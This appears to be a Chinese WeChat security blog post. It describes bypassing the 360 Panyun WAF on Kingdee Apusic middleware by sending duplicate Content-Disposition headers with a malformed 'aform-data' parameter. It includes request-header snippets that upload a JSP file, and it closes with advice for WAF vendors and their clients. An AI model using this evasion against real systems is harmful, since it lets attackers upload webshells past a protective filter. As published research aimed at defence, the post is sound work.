#  文件上传绕过360磐云WAF

原创 罗锦海 [ OneMoreThink ](javascript:void\(0\);)

**OneMoreThink** ![]()

微信号 OneMoreThinkkk

功能介绍 网络安全运营顾问。昨日所思绝非今日立场。

____

___发表于_

收录于合集 #安全技术 6个

## 测试环境

  1. 360磐云WAF
  2. 金蝶apusic中间件

## 测试方法

  1. 重复的Content-Disposition请求头
  2. 异常的form-data参数名

## 规律总结

  1. 360磐云WAF：检查所有Content-Disposition请求头，只要有一个请求头存在异常的form-data参数名，就退出检查，将流量放行给后端。
  2. 金蝶apusic中间件：只使用第一个Content-Disposition请求头，只有当第一个请求头是正确的form-data参数名时，才能正常处理业务，完成文件上传。

## 测试现象

### 单写

 **1、正常=WAF拦截**

    
    
    Content-Disposition: form-data; name="file"; filename="jsp.jsp"  
    Content-Type: image/jpeg  
    

![]()

 **2、异常=上传失败500**

    
    
    Content-Disposition: aform-data; name="file"; filename="jsp.jsp"  
    Content-Type: image/jpeg  
    

![]()

### 双写

 **3、正常,正常=WAF拦截**

    
    
    Content-Disposition: form-data; name="file"; filename="jsp.jsp"  
    Content-Type: image/jpeg  
    Content-Disposition: form-data; name="file"; filename="jsp.jsp"  
    Content-Type: image/jpeg  
    

![]()

 **4、正常,异常=上传成功200**

    
    
    Content-Disposition: form-data; name="file"; filename="jsp.jsp"  
    Content-Type: image/jpeg  
    Content-Disposition: aform-data; name="file"; filename="jsp.jsp"  
    Content-Type: image/jpeg  
    

![]()

 **5、异常,正常=上传失败500**

![]()

 **6、异常,异常=上传失败500**

![]()

##  安全建议

  1. 对甲方：应持续使用开源或商业的BAS产品，验证安全防护的有效性。
  2. 对乙方：WAF的检查逻辑，应与中间件的处理逻辑一致，以确保WAF能防护中间件。

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

